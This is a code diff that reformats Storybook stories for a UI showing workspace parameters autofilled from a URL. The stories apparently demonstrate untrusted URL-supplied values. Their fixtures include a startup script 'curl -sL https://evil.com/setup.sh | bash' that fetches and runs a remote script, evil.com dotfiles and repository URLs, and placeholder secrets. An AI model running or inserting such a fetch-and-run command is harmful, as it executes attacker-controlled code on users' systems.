@@ -48,7 +48,11 @@ export const WithManyParameters: Story = {
 			{ name: "region", value: "us-east-1", source: "url" },
 			{ name: "instance_type", value: "t3.2xlarge", source: "url" },
 			{ name: "docker_image", value: "ubuntu:24.04", source: "url" },
-			{ name: "startup_script", value: "curl -sL https://evil.com/setup.sh | bash", source: "url" },
+			{
+				name: "startup_script",
+				value: "curl -sL https://evil.com/setup.sh | bash",
+				source: "url",
+			},
 			{ name: "env_vars", value: "SECRET=hunter2,TOKEN=abc123", source: "url" },
 		],
 	},
@@ -59,12 +63,14 @@ export const WithLongValues: Story = {
 		autofillParameters: [
 			{
 				name: "dotfiles_uri",
-				value: "https://evil.com/doasdasdjkhdasjkhasdjkhasdjkhasdjkhasdjkhdashjkasdt",
+				value:
+					"https://evil.com/doasdasdjkhdasjkhasdjkhasdjkhasdjkhasdjkhdashjkasdt",
 				source: "url",
 			},
 			{
 				name: "git_repo",
-				value: "https://evil.com/repoasddsaczxjkasdjkalsdhjkasjhsadhjksdajhkdas",
+				value:
+					"https://evil.com/repoasddsaczxjkasdjkalsdhjkasjhsadhjksdajhkdas",
 				source: "url",
 			},
 		],
